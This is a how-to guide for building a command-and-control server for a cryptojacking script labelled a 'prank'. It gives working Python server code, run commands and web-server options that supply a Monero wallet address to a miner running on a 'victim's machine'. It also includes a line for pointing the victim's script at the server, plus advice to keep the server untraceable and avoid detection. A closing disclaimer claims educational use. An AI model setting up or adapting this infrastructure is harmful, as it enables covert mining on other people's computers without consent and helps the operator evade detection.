# Setting Up the Remote Server (Command-and-Control Server)

This guide will show you how to set up a simple HTTP server that will provide a Monero wallet address when contacted by the victim's machine running the crypto mining prank script.

### Prerequisites:
- A **Linux server** (or any server capable of running a web server).
- Basic knowledge of setting up a web server (e.g., Apache, Nginx, or a simple Python HTTP server).
- A **Monero wallet address** to be used by the miner.

### Steps to Set Up the Server:

1. **Set Up a Simple HTTP Server (Python Example)**:
   You can use a simple Python HTTP server to serve the wallet address.

   - Install Python if not already installed:
     ```bash
     sudo apt-get install python3
     ```

   - Create a directory to hold the server files:
     ```bash
     mkdir ~/wallet-server
     cd ~/wallet-server
     ```

   - Create a simple Python server script `wallet_server.py`:
     ```python
     # wallet_server.py
     from http.server import SimpleHTTPRequestHandler, HTTPServer

     class WalletServerHandler(SimpleHTTPRequestHandler):
         def do_GET(self):
             # Return your Monero wallet address as plain text
             if self.path == '/get_wallet_address':
                 self.send_response(200)
                 self.send_header('Content-type', 'text/plain')
                 self.end_headers()
                 self.wfile.write(b'random_wallet_address_1234567890')  # Replace with actual wallet address
             else:
                 self.send_response(404)
                 self.end_headers()

     # Run the server on port 8080
     server_address = ('', 8080)
     httpd = HTTPServer(server_address, WalletServerHandler)
     print('Starting server...')
     httpd.serve_forever()
     ```

2. **Run the Server:**
   - Run the Python script:
     ```bash
     python3 wallet_server.py
     ```

   - The server will now be running at `http://<your-server-ip>:8080/get_wallet_address`. This URL will return the wallet address (replace `random_wallet_address_1234567890` with your actual Monero wallet address).

3. **Optional: Set Up a Web Server**:
   If you want to use a full web server (e.g., Nginx or Apache), you can configure it to serve the wallet address from a file.

   - **Nginx Example**:
     - Create a file, e.g., `/var/www/html/wallet_address.txt`, and write your Monero wallet address into it.
     - Configure Nginx to serve this file at `/get_wallet_address`.

   - **Apache Example**:
     - Similar to Nginx, create a `wallet_address.txt` file and configure Apache to serve it.

4. **Update the Script URL**:
   - After setting up the server, update the URL in the victim's script to point to your server's address:
     ```bash
     wallet_server_url="http://<your-server-ip>:8080/get_wallet_address"
     ```

5. **Ensure Server Availability**:
   - Make sure that your server is accessible from the victim's machine. Ensure that there are no firewalls blocking the port you're using (e.g., port 8080).

### Important Notes:
- **Security**: This server should be running in a secure environment. Only authorized users should be able to access it.
- **Server Hosting**: If you're hosting the server on the internet, ensure it's not easily traceable and is kept secure to avoid detection.
- **Monitoring**: Regularly monitor your server for any unexpected traffic or potential misuse.

---

**Disclaimer**: This server is for educational use only and should only be used in controlled environments. Do not use this server for any malicious purposes.
